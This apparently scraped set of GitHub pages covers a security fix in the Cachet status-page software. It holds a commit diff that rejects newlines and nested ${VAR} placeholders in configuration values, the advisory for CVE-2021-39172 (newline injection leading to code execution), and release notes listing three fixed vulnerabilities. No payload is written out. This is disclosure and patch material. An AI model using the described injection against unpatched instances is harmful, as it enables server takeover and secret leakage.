    - app/Bus/Exceptions/Setting/InvalidSettingValueException.php
      [InvalidSettingValueException.php](#diff-87abf605672b36f1504e981b3c29f72b61911181ea70fccc171d6512547f8ff5)
    - app/Bus/Exceptions/Setting/SettingExceptionInterface.php
      [SettingExceptionInterface.php](#diff-0c98b9812a618d1c59b3145b30b999bcecc1c76573c9f0f3b693c0b5716f71dd)
  + Handlers/Commands/System/Config

    - app/Bus/Handlers/Commands/System/Config/UpdateConfigCommandHandler.php
      [UpdateConfigCommandHandler.php](#diff-eb49382226800036f840983b448fee50b5167e6ccba0a08a7d95e3f8a3288d44)

## There are no files selected for viewing

22 changes: 22 additions & 0 deletions

22
[app/Bus/Exceptions/Setting/InvalidSettingValueException.php](#diff-87abf605672b36f1504e981b3c29f72b61911181ea70fccc171d6512547f8ff5 "app/Bus/Exceptions/Setting/InvalidSettingValueException.php")

Show comments

[View file](/fiveai/Cachet/blob/6442976c25930cb370c65a22784b9caee7ed1de2/app/Bus/Exceptions/Setting/InvalidSettingValueException.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,22 @@ |
|  |  | <?php |
|  |  |  |
|  |  | /\* |
|  |  | \* This file is part of Cachet. |
|  |  | \* |
|  |  | \* (c) FiveAI Ltd |
|  |  | \* |
|  |  | \* For the full copyright and license information, please view the LICENSE |
|  |  | \* file that was distributed with this source code. |
|  |  | \*/ |
|  |  |  |
|  |  | namespace CachetHQ\Cachet\Bus\Exceptions\Setting; |
|  |  |  |
|  |  | use Exception; |
|  |  |  |
|  |  | /\*\* |
|  |  | \* This is the invalid setting value exception. |
|  |  | \*/ |
|  |  | class InvalidSettingValueException extends Exception implements SettingExceptionInterface |
|  |  | { |
|  |  | // |
|  |  | } |

22 changes: 22 additions & 0 deletions

22
[app/Bus/Exceptions/Setting/SettingExceptionInterface.php](#diff-0c98b9812a618d1c59b3145b30b999bcecc1c76573c9f0f3b693c0b5716f71dd "app/Bus/Exceptions/Setting/SettingExceptionInterface.php")

Show comments

[View file](/fiveai/Cachet/blob/6442976c25930cb370c65a22784b9caee7ed1de2/app/Bus/Exceptions/Setting/SettingExceptionInterface.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,22 @@ |
|  |  | <?php |
|  |  |  |
|  |  | /\* |
|  |  | \* This file is part of Cachet. |
|  |  | \* |
|  |  | \* (c) FiveAI Ltd |
|  |  | \* |
|  |  | \* For the full copyright and license information, please view the LICENSE |
|  |  | \* file that was distributed with this source code. |
|  |  | \*/ |
|  |  |  |
|  |  | namespace CachetHQ\Cachet\Bus\Exceptions\Setting; |
|  |  |  |
|  |  | use CachetHQ\Cachet\Bus\Exceptions\ExceptionInterface; |
|  |  |  |
|  |  | /\*\* |
|  |  | \* This is the setting exception interface. |
|  |  | \*/ |
|  |  | interface SettingExceptionInterface extends ExceptionInterface |
|  |  | { |
|  |  | // |
|  |  | } |

92 changes: 74 additions & 18 deletions

92
[app/Bus/Handlers/Commands/System/Config/UpdateConfigCommandHandler.php](#diff-eb49382226800036f840983b448fee50b5167e6ccba0a08a7d95e3f8a3288d44 "app/Bus/Handlers/Commands/System/Config/UpdateConfigCommandHandler.php")

Show comments

[View file](/fiveai/Cachet/blob/6442976c25930cb370c65a22784b9caee7ed1de2/app/Bus/Handlers/Commands/System/Config/UpdateConfigCommandHandler.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -12,8 +12,9 @@ |
|  |  | namespace CachetHQ\Cachet\Bus\Handlers\Commands\System\Config; |
|  |  |  |
|  |  | use CachetHQ\Cachet\Bus\Commands\System\Config\UpdateConfigCommand; |
|  |  | use CachetHQ\Cachet\Bus\Exceptions\Setting\InvalidSettingValueException; |
|  |  | use Dotenv\Dotenv; |
|  |  | use Dotenv\Exception\InvalidPathException; |
|  |  | use Illuminate\Filesystem\Filesystem; |
|  |  |  |
|  |  | /\*\* |
|  |  | \* This is the update config command handler class. |
| Expand All | | @@ -22,6 +23,29 @@ |
|  |  | \*/ |
|  |  | class UpdateConfigCommandHandler |
|  |  | { |
|  |  | /\*\* |
|  |  | \* @var string |
|  |  | \*/ |
|  |  | protected $dir; |
|  |  |  |
|  |  | /\*\* |
|  |  | \* @var string |
|  |  | \*/ |
|  |  | protected $file; |
|  |  |  |
|  |  | /\*\* |
|  |  | \* @var string |
|  |  | \*/ |
|  |  | protected $path; |
|  |  |  |
|  |  | public function \_\_construct(Filesystem $filesystem) |
|  |  | { |
|  |  | $this->dir = app()->environmentPath(); |
|  |  | $this->file = app()->environmentFile(); |
|  |  | $this->path = "{$this->dir}/{$this->file}"; |
|  |  | $this->filesystem = $filesystem; |
|  |  | } |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Handle update config command handler instance. |
|  |  | \* |
| Expand All | | @@ -34,6 +58,38 @@ public function handle(UpdateConfigCommand $command) |
|  |  | foreach ($command->values as $setting => $value) { |
|  |  | $this->writeEnv($setting, $value); |
|  |  | } |
|  |  |  |
|  |  | if (app()->configurationIsCached()) { |
|  |  | $this->filesystem->delete(app()->getCachedConfigPath()); |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Replicate phpdotenv's nested variable resolution to identify if a given |
|  |  | \* value contains such sequences. |
|  |  | \* |
|  |  | \* @param string $value |
|  |  | \* |
|  |  | \* @return string |
|  |  | \*/ |
|  |  | protected function resolveNestedVariables($value) |
|  |  | { |
|  |  | if (strpos($value, '$') !== false) { |
|  |  | $value = preg\_replace\_callback( |
|  |  | '/\${([a-zA-Z0-9\_.]+)}/', |
|  |  | function ($matchedPatterns) { |
|  |  | $nestedVariable = env($matchedPatterns[1]); |
|  |  | if ($nestedVariable === null) { |
|  |  | return $matchedPatterns[0]; |
|  |  | } else { |
|  |  | return $nestedVariable; |
|  |  | } |
|  |  | }, |
|  |  | $value |
|  |  | ); |
|  |  | } |
|  |  |  |
|  |  | return $value; |
|  |  | } |
|  |  |  |
|  |  | /\*\* |
| Expand All | | @@ -46,23 +102,23 @@ public function handle(UpdateConfigCommand $command) |
|  |  | \*/ |
|  |  | protected function writeEnv($key, $value) |
|  |  | { |
|  |  | $dir = app()->environmentPath(); |
|  |  | $file = app()->environmentFile(); |
|  |  | $path = "{$dir}/{$file}"; |
|  |  |  |
|  |  | try { |
|  |  | (new Dotenv($dir, $file))->load(); |
|  |  |  |
|  |  | $envKey = strtoupper($key); |
|  |  | $envValue = env($envKey) ?: 'null'; |
|  |  |  |
|  |  | file\_put\_contents($path, str\_replace( |
|  |  | "{$envKey}={$envValue}", |
|  |  | "{$envKey}={$value}", |
|  |  | file\_get\_contents($path) |
|  |  | )); |
|  |  | } catch (InvalidPathException $e) { |
|  |  | throw $e; |
|  |  | if (strstr($key, "\n") !== false || strstr($value, "\n") !== false) { |
|  |  | throw new InvalidSettingValueException('New setting key or value contains new lines'); |
|  |  | } |
|  |  |  |
|  |  | (new Dotenv($this->dir, $this->file))->safeLoad(); |
|  |  |  |
|  |  | $envKey = strtoupper($key); |
|  |  | $envValue = env($envKey) ?: 'null'; |
|  |  |  |
|  |  | if ($this->resolveNestedVariables($value) !== $value) { |
|  |  | throw new InvalidSettingValueException("New setting key $envKey contains a nested variable"); |
|  |  | } |
|  |  |  |
|  |  | file\_put\_contents($this->path, str\_replace( |
|  |  | "{$envKey}={$envValue}", |
|  |  | "{$envKey}={$value}", |
|  |  | file\_get\_contents($this->path) |
|  |  | )); |
|  |  | } |
|  |  | } |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `6442976`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ffiveai%2FCachet%2Fcommit%2F6442976c25930cb370c65a22784b9caee7ed1de2) to comment.

## Footer

Â© 2025 GitHub,Â Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You canâ€™t perform that action at this time.



=== Content from github.com_4e31cb29_20250114_223151.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ffiveai%2FCachet%2Fsecurity%2Fadvisories%2FGHSA-9jxw-cfrh-jxq6)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ffiveai%2FCachet%2Fsecurity%2Fadvisories%2FGHSA-9jxw-cfrh-jxq6)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=fiveai%2FCachet)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[fiveai](/fiveai)
/
**[Cachet](/fiveai/Cachet)**
Public

forked from [cachethq/cachet](/cachethq/cachet)

* [Notifications](/login?return_to=%2Ffiveai%2FCachet) You must be signed in to change notification settings
* [Fork
  27](/login?return_to=%2Ffiveai%2FCachet)
* [Star
   102](/login?return_to=%2Ffiveai%2FCachet)

* [Code](/fiveai/Cachet)
* [Issues
  32](/fiveai/Cachet/issues)
* [Pull requests
  8](/fiveai/Cachet/pulls)
* [Actions](/fiveai/Cachet/actions)
* [Projects
  0](/fiveai/Cachet/projects)
* [Security](/fiveai/Cachet/security)
* [Insights](/fiveai/Cachet/pulse)

Additional navigation options

* [Code](/fiveai/Cachet)
* [Issues](/fiveai/Cachet/issues)
* [Pull requests](/fiveai/Cachet/pulls)
* [Actions](/fiveai/Cachet/actions)
* [Projects](/fiveai/Cachet/projects)
* [Security](/fiveai/Cachet/security)
* [Insights](/fiveai/Cachet/pulse)

# New line injection during configuration edition

High

[sedan07](/sedan07)
published
GHSA-9jxw-cfrh-jxq6
Aug 27, 2021

## Package

composer

cachethq/cachet
([Composer](/advisories?query=ecosystem%3Acomposer))

## Affected versions

<= 2.5.0

## Patched versions

2.5.1

## Description

### Impact

Authenticated users, regardless of their privileges (*User* or *Admin*), can exploit a new line injection in the configuration edition feature (e.g. mail settings) and gain arbitrary code execution on the server.

### Patches

This issue was addressed by improving `UpdateConfigCommandHandler` and preventing the use of new lines characters in new configuration values.

### Workarounds

Only allow trusted source IP addresses to access to the administration dashboard.

### References

* <https://blog.sonarsource.com/cachet-code-execution-via-laravel-configuration-injection>

### For more information

If you have any questions or comments about this advisory, you can contact:

* The original reporters, by sending an email to vulnerability.research [at] sonarsource.com;
* The maintainers, by opening an issue on this repository.

### Severity

High

### CVE ID

CVE-2021-39172

### Weaknesses

[CWE-93](/advisories?query=cwe%3A93)

### Credits

* [![@thomas-chauchefoin-sonarsource](https://avatars.githubusercontent.com/u/79814170?s=40&v=4)](/thomas-chauchefoin-sonarsource)
  [thomas-chauchefoin-sonarsource](/thomas-chauchefoin-sonarsource)
  Analyst

## Footer

Â© 2025 GitHub,Â Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You canâ€™t perform that action at this time.



=== Content from github.com_740a7130_20250114_223149.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ffiveai%2FCachet%2Freleases%2Ftag%2Fv2.5.1)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ffiveai%2FCachet%2Freleases%2Ftag%2Fv2.5.1)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Freleases%2Fshow&source=header-repo&source_repo=fiveai%2FCachet)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[fiveai](/fiveai)
/
**[Cachet](/fiveai/Cachet)**
Public

forked from [cachethq/cachet](/cachethq/cachet)

* [Notifications](/login?return_to=%2Ffiveai%2FCachet) You must be signed in to change notification settings
* [Fork
  27](/login?return_to=%2Ffiveai%2FCachet)
* [Star
   102](/login?return_to=%2Ffiveai%2FCachet)

* [Code](/fiveai/Cachet/tree/v2.5.1)
* [Issues
  32](/fiveai/Cachet/issues)
* [Pull requests
  8](/fiveai/Cachet/pulls)
* [Actions](/fiveai/Cachet/actions)
* [Projects
  0](/fiveai/Cachet/projects)
* [Security](/fiveai/Cachet/security)
* [Insights](/fiveai/Cachet/pulse)

Additional navigation options

* [Code](/fiveai/Cachet/tree/v2.5.1)
* [Issues](/fiveai/Cachet/issues)
* [Pull requests](/fiveai/Cachet/pulls)
* [Actions](/fiveai/Cachet/actions)
* [Projects](/fiveai/Cachet/projects)
* [Security](/fiveai/Cachet/security)
* [Insights](/fiveai/Cachet/pulse)

1. [Releases](/fiveai/Cachet/releases)
2. [v2.5.1](/fiveai/Cachet/releases/tag/v2.5.1)

# v2.5.1

[Latest](/fiveai/Cachet/releases/latest)

[Latest](/fiveai/Cachet/releases/latest)

 Compare

Choose a tag to compare

Could not load tags

Nothing to show

[{{ refName }}
default](/fiveai/Cachet/compare/%7B%7B%20urlEncodedRefName%20%7D%7D...v2.5.1)

 Loading

[View all tags](/fiveai/Cachet/tags)

![@sedan07](https://avatars.githubusercontent.com/u/1449113?s=40&v=4)
[sedan07](/sedan07)
released this
27 Aug 16:49

Â·
[10 commits](/fiveai/Cachet/compare/v2.5.1...2.6)
to 2.6
since this release

[v2.5.1](/fiveai/Cachet/tree/v2.5.1)

This tag was signed with the committerâ€™s **verified signature**.
The key has expired.

[![](https://avatars.githubusercontent.com/u/1449113?s=64&v=4)](/sedan07)
[sedan07](/sedan07)
Seb Dangerfield

GPG key ID: F01847A1B5D1017E
Expired

[Learn about vigilant mode](https://docs.github.com/github/authenticating-to-github/displaying-verification-statuses-for-all-of-your-commits).

[`d7ecabf`](/fiveai/Cachet/commit/d7ecabfb5db4872470508671348408b14abcadcb)

This commit was signed with the committerâ€™s **verified signature**.
The key has expired.

[![](https://avatars.githubusercontent.com/u/1449113?s=64&v=4)](/sedan07)
[sedan07](/sedan07)
Seb Dangerfield

GPG key ID: F01847A1B5D1017E
Expired

[Learn about vigilant mode](https://docs.github.com/github/authenticating-to-github/displaying-verification-statuses-for-all-of-your-commits).

### Fixed

* **[SECURITY VULNERABILITY]** Configuration leak, user/admin users could leak the value of any config entry from .env file by using variable placeholders. Setting values are now sanitised ([GHSA-88f9-7xxh-c688](https://github.com/advisories/GHSA-88f9-7xxh-c688 "GHSA-88f9-7xxh-c688")). Thanks to [@thomas-chauchefoin-sonarsource](https://github.com/thomas-chauchefoin-sonarsource)
* **[SECURITY VULNERABILITY]** New line injection during configuration editing possible by a user/admin. Setting values are now sanitised ([GHSA-9jxw-cfrh-jxq6](https://github.com/advisories/GHSA-9jxw-cfrh-jxq6 "GHSA-9jxw-cfrh-jxq6")). Thanks to [@thomas-chauchefoin-sonarsource](https://github.com/thomas-chauchefoin-sonarsource)
* **[SECURITY VULNERABILITY]** Forced reinstall, user/admin users could trick Cachet to allow them to access the /setup endpoint and reinstall the whole instance. Fixed by preventing clearing the instance name. ([GHSA-r67m-m8c7-jp83](https://github.com/advisories/GHSA-r67m-m8c7-jp83 "GHSA-r67m-m8c7-jp83")). Thanks to [@thomas-chauchefoin-sonarsource](https://github.com/thomas-chauchefoin-sonarsource)
* Resend edit subscription email to existing subscribers on request [#52](https://github.com/fiveai/Cachet/issues/52)

### Container Image:

[`sedan07/cachet:v2.5.1`](https://hub.docker.com/layers/sedan07/cachet/v2.5.1/images/sha256-77bfb10fa1a97b019ce108a97d5c33d3eeba6d56eabfd8ccb36017847a0b4b81?context=explore)

### Contributors

* [![@thomas-chauchefoin-sonarsource](https://avatars.githubusercontent.com/u/79814170?s=64&v=4)](https://github.com/thomas-chauchefoin-sonarsource)

thomas-chauchefoin-sonarsource

 Assets
2

 Loading

All reactions

## Footer

Â© 2025 GitHub,Â Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You canâ€™t perform that action at this time.


